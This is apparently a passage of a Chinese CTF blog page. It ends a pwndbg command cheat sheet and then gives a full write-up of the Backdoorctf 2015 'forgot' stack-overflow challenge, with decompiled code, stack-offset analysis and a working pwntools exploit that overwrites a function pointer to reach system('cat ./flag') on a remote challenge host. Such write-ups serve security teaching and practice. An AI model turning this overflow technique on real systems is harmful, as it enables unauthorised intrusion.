<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; b *<span class="number">0x7ffff7b042a9</span></span><br><span class="line">Breakpoint <span class="number">4</span> at <span class="number">0x7ffff7b042a9</span>: file ../sysdeps/unix/syscall-<span class="keyword">template</span>.S, line <span class="number">86.</span></span><br></pre></td></tr></table></figure>

<p>b *reg</p>
<p>根据寄存器的值下断点</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; b *$r12</span><br><span class="line">Breakpoint <span class="number">5</span> at <span class="number">0x5555555548f0</span></span><br></pre></td></tr></table></figure>

<p>下完断点后 c（continue）命令，程序会在你下的断点处断下来，但是前提是你要保证程序会执行到那里</p>
<h3 id="rwatch"><a href="#rwatch" class="headerlink" title="rwatch"></a>rwatch</h3><p>内存访问断点</p>
<p>rwatch *addr</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; rwatch *<span class="number">0x7ffff7dd18e0</span></span><br><span class="line">Hardware read watchpoint <span class="number">6</span>: *<span class="number">0x7ffff7dd18e0</span></span><br></pre></td></tr></table></figure>

<h2 id="dump-内存"><a href="#dump-内存" class="headerlink" title="dump 内存"></a>dump 内存</h2><p>dump memory filename start_addr stop_addr</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; ls</span><br><span class="line">dice_game  dice_game.i64  dicegame.zip	<span class="built_in">exp</span>.py	libc.so<span class="number">.6</span>  t  t.c</span><br><span class="line"></span><br><span class="line">pwndbg&gt; dump memory dump.dmp <span class="number">0x7fffffffd4c8</span> <span class="number">0x7fffffffd4d0</span></span><br><span class="line"></span><br><span class="line">pwndbg&gt; ls</span><br><span class="line">dice_game  dice_game.i64  dicegame.zip	dump.dmp  <span class="built_in">exp</span>.py  libc.so<span class="number">.6</span>  t	t.c</span><br><span class="line"></span><br><span class="line"><span class="comment">//dump.dmp就是我们dump下来的内存</span></span><br></pre></td></tr></table></figure>

<h1 id="ROP"><a href="#ROP" class="headerlink" title="ROP"></a>ROP</h1><h2 id="神奇的一个gadget"><a href="#神奇的一个gadget" class="headerlink" title="神奇的一个gadget"></a>神奇的一个gadget</h2><p>__do_global_dtors_aux函数里的</p>
<h1 id="adc-rbp-48h-edx"><a href="#adc-rbp-48h-edx" class="headerlink" title="adc     [rbp+48h], edx"></a>adc     [rbp+48h], edx</h1><p>edx和rbp都可控</p>

        
      
    </div>

    
    
    
      <footer class="post-footer">
          <div class="post-eof"></div>
        
      </footer>
  </div>
  
  
  
  </article>

    
       <article itemscope itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block home">
    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2019/09/02/Backdoorctf-2015-forgot/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="name" content="ZERO-A-ONE">
      <meta itemprop="description" content="Resit much,Obey little">
      <meta itemprop="image" content="/images/avatar.gif">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="ZERO-A-ONE">
    </span>
      <header class="post-header">
        <h1 class="post-title" itemprop="name headline">
            
            <a href="/2019/09/02/Backdoorctf-2015-forgot/" class="post-title-link" itemprop="url">Backdoorctf-2015-forgot</a>
          
        </h1>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              <span class="post-meta-item-text">Posted on</span>

              
                
              

              <time title="Created: 2019-09-02 10:04:51" itemprop="dateCreated datePublished" datetime="2019-09-02T10:04:51-07:00">2019-09-02</time>
            </span>
          
            

            
              <span class="post-meta-item">
                <span class="post-meta-item-icon">
                  <i class="fa fa-calendar-check-o"></i>
                </span>
                <span class="post-meta-item-text">Edited on</span>
                <time title="Modified: 2019-09-03 01:05:16" itemprop="dateModified" datetime="2019-09-03T01:05:16-07:00">2019-09-03</time>
              </span>
            
          

          

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <p>一道普通的栈溢出题目</p>
<p>我们首先来检查一下获得的文件</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Arch:     i386-32-little</span><br><span class="line">RELRO:    Partial RELRO</span><br><span class="line">Stack:    No canary found</span><br><span class="line">NX:       NX enabled</span><br><span class="line">PIE:      No PIE (0x8048000)</span><br></pre></td></tr></table></figure>

<p>只开启了NX保护，没有什么太特殊的保护措施，我们在用IDA Pro看一下反汇编代码</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span> __<span class="function">cdecl <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">size_t</span> v0; <span class="comment">// ebx</span></span><br><span class="line">  <span class="keyword">char</span> v2[<span class="number">32</span>]; <span class="comment">// [esp+10h] [ebp-74h]</span></span><br><span class="line">  <span class="keyword">int</span> (*v3)(); <span class="comment">// [esp+30h] [ebp-54h]</span></span><br><span class="line">  <span class="keyword">int</span> (*v4)(); <span class="comment">// [esp+34h] [ebp-50h]</span></span><br><span class="line">  <span class="keyword">int</span> (*v5)(); <span class="comment">// [esp+38h] [ebp-4Ch]</span></span><br><span class="line">  <span class="keyword">int</span> (*v6)(); <span class="comment">// [esp+3Ch] [ebp-48h]</span></span><br><span class="line">  <span class="keyword">int</span> (*v7)(); <span class="comment">// [esp+40h] [ebp-44h]</span></span><br><span class="line">  <span class="keyword">int</span> (*v8)(); <span class="comment">// [esp+44h] [ebp-40h]</span></span><br><span class="line">  <span class="keyword">int</span> (*v9)(); <span class="comment">// [esp+48h] [ebp-3Ch]</span></span><br><span class="line">  <span class="keyword">int</span> (*v10)(); <span class="comment">// [esp+4Ch] [ebp-38h]</span></span><br><span class="line">  <span class="keyword">int</span> (*v11)(); <span class="comment">// [esp+50h] [ebp-34h]</span></span><br><span class="line">  <span class="keyword">int</span> (*v12)(); <span class="comment">// [esp+54h] [ebp-30h]</span></span><br><span class="line">  <span class="keyword">char</span> s; <span class="comment">// [esp+58h] [ebp-2Ch]</span></span><br><span class="line">  <span class="keyword">int</span> v14; <span class="comment">// [esp+78h] [ebp-Ch]</span></span><br><span class="line">  <span class="keyword">size_t</span> i; <span class="comment">// [esp+7Ch] [ebp-8h]</span></span><br><span class="line"></span><br><span class="line">  v14 = <span class="number">1</span>;</span><br><span class="line">  v3 = sub_8048604;</span><br><span class="line">  v4 = sub_8048618;</span><br><span class="line">  v5 = sub_804862C;</span><br><span class="line">  v6 = sub_8048640;</span><br><span class="line">  v7 = sub_8048654;</span><br><span class="line">  v8 = sub_8048668;</span><br><span class="line">  v9 = sub_804867C;</span><br><span class="line">  v10 = sub_8048690;</span><br><span class="line">  v11 = sub_80486A4;</span><br><span class="line">  v12 = sub_80486B8;</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"What is your name?"</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"&gt; "</span>);</span><br><span class="line">  fflush(<span class="built_in">stdout</span>);</span><br><span class="line">  fgets(&amp;s, <span class="number">32</span>, <span class="built_in">stdin</span>);</span><br><span class="line">  sub_80485DD(&amp;s);</span><br><span class="line">  fflush(<span class="built_in">stdout</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"I should give you a pointer perhaps. Here: %x\n\n"</span>, sub_8048654);</span><br><span class="line">  fflush(<span class="built_in">stdout</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"Enter the string to be validate"</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"&gt; "</span>);</span><br><span class="line">  fflush(<span class="built_in">stdout</span>);</span><br><span class="line">  __isoc99_scanf(<span class="string">"%s"</span>, v2);</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; ; ++i )</span><br><span class="line">  &#123;</span><br><span class="line">    v0 = i;</span><br><span class="line">    <span class="keyword">if</span> ( v0 &gt;= <span class="built_in">strlen</span>(v2) )</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">switch</span> ( v14 )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">1</span>:</span><br><span class="line">        <span class="keyword">if</span> ( sub_8048702(v2[i]) )</span><br><span class="line">          v14 = <span class="number">2</span>;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">2</span>:</span><br><span class="line">        <span class="keyword">if</span> ( v2[i] == <span class="number">64</span> )</span><br><span class="line">          v14 = <span class="number">3</span>;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">3</span>:</span><br><span class="line">        <span class="keyword">if</span> ( sub_804874C(v2[i]) )</span><br><span class="line">          v14 = <span class="number">4</span>;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">4</span>:</span><br><span class="line">        <span class="keyword">if</span> ( v2[i] == <span class="number">46</span> )</span><br><span class="line">          v14 = <span class="number">5</span>;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">5</span>:</span><br><span class="line">        <span class="keyword">if</span> ( sub_8048784(v2[i]) )</span><br><span class="line">          v14 = <span class="number">6</span>;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">6</span>:</span><br><span class="line">        <span class="keyword">if</span> ( sub_8048784(v2[i]) )</span><br><span class="line">          v14 = <span class="number">7</span>;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">7</span>:</span><br><span class="line">        <span class="keyword">if</span> ( sub_8048784(v2[i]) )</span><br><span class="line">          v14 = <span class="number">8</span>;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">8</span>:</span><br><span class="line">        <span class="keyword">if</span> ( sub_8048784(v2[i]) )</span><br><span class="line">          v14 = <span class="number">9</span>;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">9</span>:</span><br><span class="line">        v14 = <span class="number">10</span>;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">default</span>:</span><br><span class="line">        <span class="keyword">continue</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  (*(&amp;v3 + --v14))();</span><br><span class="line">  <span class="keyword">return</span> fflush(<span class="built_in">stdout</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>毫无头绪，我们先尝试搜索一下<code>flag</code>，<code>sysytem</code>，<code>cat</code>等常用字符串，看看能不能寻找到什么有用的线索，我们发现了<code>sub_80486CC</code>函数</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">.text:<span class="number">080486</span>CC ; =============== S U B R O U T I N E =======================================</span><br><span class="line">.text:<span class="number">080486</span>CC</span><br><span class="line">.text:<span class="number">080486</span>CC ; Attributes: bp-based frame</span><br><span class="line">.text:<span class="number">080486</span>CC</span><br><span class="line">.text:<span class="number">080486</span>CC sub_80486CC     proc near</span><br><span class="line">.text:<span class="number">080486</span>CC</span><br><span class="line">.text:<span class="number">080486</span>CC s               = byte ptr <span class="number">-3</span>Ah</span><br><span class="line">.text:<span class="number">080486</span>CC</span><br><span class="line">.text:<span class="number">080486</span>CC ; __unwind &#123;</span><br><span class="line">.text:<span class="number">080486</span>CC                 push    ebp</span><br><span class="line">.text:<span class="number">080486</span>CD                 mov     ebp, esp</span><br><span class="line">.text:<span class="number">080486</span>CF                 sub     esp, <span class="number">58</span>h</span><br><span class="line">.text:<span class="number">080486</span>D2                 mov     dword ptr [esp+<span class="number">0</span>Ch], offset aFlag ; <span class="string">"./flag"</span></span><br><span class="line">.text:<span class="number">080486</span>DA                 mov     dword ptr [esp+<span class="number">8</span>], offset aCatS ; <span class="string">"cat %s"</span></span><br><span class="line">.text:<span class="number">080486E2</span>                 mov     dword ptr [esp+<span class="number">4</span>], <span class="number">32</span>h ; maxlen</span><br><span class="line">.text:<span class="number">080486</span>EA                 lea     eax, [ebp+s]</span><br><span class="line">.text:<span class="number">080486</span>ED                 mov     [esp], eax      ; s</span><br><span class="line">.text:<span class="number">080486F</span>0                 call    _snprintf</span><br><span class="line">.text:<span class="number">080486F</span>5                 lea     eax, [ebp+s]</span><br><span class="line">.text:<span class="number">080486F</span>8                 mov     [esp], eax      ; command</span><br><span class="line">.text:<span class="number">080486F</span>B                 call    _system</span><br><span class="line">.text:<span class="number">08048700</span>                 leave</span><br><span class="line">.text:<span class="number">08048701</span>                 retn</span><br><span class="line">.text:<span class="number">08048701</span> ; &#125; <span class="comment">// starts at 80486CC</span></span><br><span class="line">.text:<span class="number">08048701</span> sub_80486CC     endp</span><br><span class="line">.text:<span class="number">08048701</span></span><br><span class="line">.text:<span class="number">08048702</span></span><br></pre></td></tr></table></figure>

<p>我们不难看出这个函数调用了<code>system</code>函数，且执行了<code>cat flag</code>的命令，为了方便阅读反汇编一下</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">sub_80486CC</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">char</span> s; <span class="comment">// [esp+1Eh] [ebp-3Ah]</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">snprintf</span>(&amp;s, <span class="number">0x32</span>u, <span class="string">"cat %s"</span>, <span class="string">"./flag"</span>);</span><br><span class="line">  <span class="keyword">return</span> system(&amp;s);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>我们现在大概有思路了，就是通过栈溢出控制程序的path到这个函数上就可以查看到flag了，现在来分析程序</p>
<p>我们可以发现两个溢出点<code>fgets(&amp;s, 32, stdin);</code>和<code>__isoc99_scanf(&quot;%s&quot;, v2);</code>，我们不难分析出第一个溢出点对于控制程序path没有任何的帮助，我们继续分析第二个溢出点下的<code>for</code>循环，我们发现了一个函数指针<code>(*(&amp;v3 + --v14))();</code>，所谓函数指针其实就是可以直接执行指针所指向的函数，我们可以得知这是关键，前面的switch函数都是障眼法</p>
<p>我们可以得知控制的关键是<strong>v3</strong>和<strong>v14</strong>两个值，这时候我们再看这个<code>for</code>循环其实就是在控制<strong>v14</strong>的值，每执行一次<strong>v14</strong>的值就减小<strong>1</strong>，然而程序<strong>v14</strong>的初始值即为1，因为是<code>--v14</code>，故这时候其实<strong>v14</strong>的值即为<strong>0</strong>，函数指针指向的即是<strong>v3</strong>保存的地址，我们只需要修改<strong>v3</strong>的值为函数<code>sub_80486CC</code>的地址<code>0x080486cc</code>即可</p>
<p>观察栈地址分布</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">char</span> v2[<span class="number">32</span>]; <span class="comment">// [esp+10h] [ebp-74h]</span></span><br><span class="line"><span class="keyword">int</span> (*v3)(); <span class="comment">// [esp+30h] [ebp-54h]</span></span><br><span class="line"><span class="keyword">int</span> (*v4)(); <span class="comment">// [esp+34h] [ebp-50h]</span></span><br><span class="line"><span class="keyword">int</span> (*v5)(); <span class="comment">// [esp+38h] [ebp-4Ch]</span></span><br><span class="line"><span class="keyword">int</span> (*v6)(); <span class="comment">// [esp+3Ch] [ebp-48h]</span></span><br><span class="line"><span class="keyword">int</span> (*v7)(); <span class="comment">// [esp+40h] [ebp-44h]</span></span><br><span class="line"><span class="keyword">int</span> (*v8)(); <span class="comment">// [esp+44h] [ebp-40h]</span></span><br><span class="line"><span class="keyword">int</span> (*v9)(); <span class="comment">// [esp+48h] [ebp-3Ch]</span></span><br><span class="line"><span class="keyword">int</span> (*v10)(); <span class="comment">// [esp+4Ch] [ebp-38h]</span></span><br><span class="line"><span class="keyword">int</span> (*v11)(); <span class="comment">// [esp+50h] [ebp-34h]</span></span><br><span class="line"><span class="keyword">int</span> (*v12)(); <span class="comment">// [esp+54h] [ebp-30h]</span></span><br><span class="line"><span class="keyword">char</span> s; <span class="comment">// [esp+58h] [ebp-2Ch]</span></span><br><span class="line"><span class="keyword">int</span> v14; <span class="comment">// [esp+78h] [ebp-Ch]</span></span><br><span class="line"><span class="keyword">size_t</span> i; <span class="comment">// [esp+7Ch] [ebp-8h]</span></span><br></pre></td></tr></table></figure>

<p>我们可以控制<strong>v3</strong>到<strong>v14</strong>的所有变量，因为字符串<strong>v2</strong>处在<code>ebp-74h</code>的位置和<strong>v3</strong>相差<strong>74h-54h=20h</strong>的距离，故我们的<strong>payload</strong>即可写成<code>payload=&#39;A&#39;*0x20+p32(0x080486cc)</code></p>
<p>最终的Exploit为</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#! /usr/bin/env python</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">p=remote(<span class="string">'111.198.29.45'</span>,<span class="number">56015</span>)</span><br><span class="line"><span class="keyword">print</span> p.recvuntil(<span class="string">"&gt; "</span>)</span><br><span class="line">p.sendline(<span class="string">'A'</span>)</span><br><span class="line">payload=<span class="string">'A'</span>*<span class="number">32</span>+p32(<span class="number">0x080486cc</span>)</span><br><span class="line"><span class="keyword">print</span> p.recvuntil(<span class="string">"&gt; "</span>)</span><br><span class="line">p.sendline(payload)</span><br><span class="line"><span class="keyword">print</span> p.recvall()</span><br></pre></td></tr></table></figure>


        
      
    </div>

    
    
    
      <footer class="post-footer">
          <div class="post-eof"></div>
        
      </footer>
  </div>
  
  
  
  </article>

    
  </div>

  
  <nav class="pagination">
    <a class="extend prev" rel="prev" href="/page/5/"><i class="fa fa-angle-left" aria-label="Previous page"></i></a><a class="page-number" href="/">1</a><span class="space">&hellip;</span><a class="page-number" href="/page/5/">5</a><span class="page-number current">6</span><a class="page-number" href="/page/7/">7</a><a class="page-number" href="/page/8/">8</a><a class="extend next" rel="next" href="/page/7/"><i class="fa fa-angle-right" aria-label="Next page"></i></a>
  </nav>


          </div>
          

        </div>
          
  
  <div class="sidebar-toggle">
    <div class="sidebar-toggle-line-wrap">
      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
    </div>
  </div>

  <aside class="sidebar">
    <div class="sidebar-inner">

      <ul class="sidebar-nav motion-element">
        <li class="sidebar-nav-toc">
          Table of Contents
        </li>
        <li class="sidebar-nav-overview">
          Overview
        </li>
      </ul>

      <!--noindex-->
      <div class="post-toc-wrap sidebar-panel">
      </div>
      <!--/noindex-->

      <div class="site-overview-wrap sidebar-panel">
        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
  <p class="site-author-name" itemprop="name">ZERO-A-ONE</p>
  <div class="site-description" itemprop="description">Resit much,Obey little</div>
</div>
  <nav class="site-state motion-element">
      <div class="site-state-item site-state-posts">
        
          <a href="/archives/">
        
          <span class="site-state-item-count">71</span>
          <span class="site-state-item-name">posts</span>
        </a>
      </div>
    
      
      
      <div class="site-state-item site-state-categories">
        
        <span class="site-state-item-count">2</span>
        <span class="site-state-item-name">categories</span>
        
      </div>
    
  </nav>
  <div class="feed-link motion-element">
    <a href="/atom.xml" rel="alternate">
      <i class="fa fa-rss"></i>RSS
    </a>
  </div>



      </div>

    </div>
  </aside>
  <div id="sidebar-dimmer"></div>


      </div>
    </main>

    <footer id="footer" class="footer">
      <div class="footer-inner">
        <div class="copyright">&copy; <span itemprop="copyrightYear">2020</span>
  <span class="with-love" id="animate">
    <i class="fa fa-user"></i>
  </span>
  <span class="author" itemprop="copyrightHolder">ZERO-A-ONE</span>
</div>
  <div class="powered-by">Powered by <a href="https://hexo.io" class="theme-link" rel="noopener" target="_blank">Hexo</a> v3.9.0</div>
  <span class="post-meta-divider">|</span>
  <div class="theme-info">Theme – <a href="https://theme-next.org" class="theme-link" rel="noopener" target="_blank">NexT.Gemini</a> v7.4.0</div>

<div>
<script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
<span id="busuanzi_container_site_pv" style='display:none'>
    本站总访问量 <span id="busuanzi_value_site_pv"></span> 次
    <span class="post-meta-divider">|</span>
</span>
<span id="busuanzi_container_site_uv" style='display:none'>
    有<span id="busuanzi_value_site_uv"></span>人看过我的博客啦
</span>
</div>

        












        
      </div>
    </footer>
  </div>

  


  <script src="/lib/anime.min.js?v=3.1.0"></script>
  <script src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
  <script src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
<script src="/js/utils.js?v=7.4.0"></script><script src="/js/motion.js?v=7.4.0"></script>
<script src="/js/schemes/pisces.js?v=7.4.0"></script>

<script src="/js/next-boot.js?v=7.4.0"></script>



  








  <script src="/js/local-search.js?v=7.4.0"></script>














  

  

  

</body>
</html>
